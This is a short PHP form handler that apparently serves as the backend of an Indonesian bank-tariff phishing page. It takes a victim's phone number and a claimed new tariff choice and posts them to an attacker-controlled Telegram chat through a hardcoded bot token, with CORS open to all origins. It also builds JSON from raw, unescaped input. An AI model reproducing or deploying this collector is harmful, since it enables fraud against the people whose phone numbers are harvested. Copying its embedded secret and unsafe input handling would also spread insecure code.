<?php
header('Access-Control-Allow-Origin: *');
$token = "7432416634:AAH7EZps8Ra7LI9Bf53YEo4hBha9a1afo9A";
$chatID = "6932788589";
$tarif = $_POST['radio'];
$tarifText = '';
if ($tarif == 'radio1') {
  $tarifText = 'Tarif Baru Rp150.000/Bulan';
} else {
  $tarifText = 'Tarif Baru Rp6.500/Transaksi';
}
$content = "<b>No. HP:</b> ".$_POST['nohp']."\n<b>Tarif:</b> ".$tarifText;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"".$content."\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
echo $server_output;
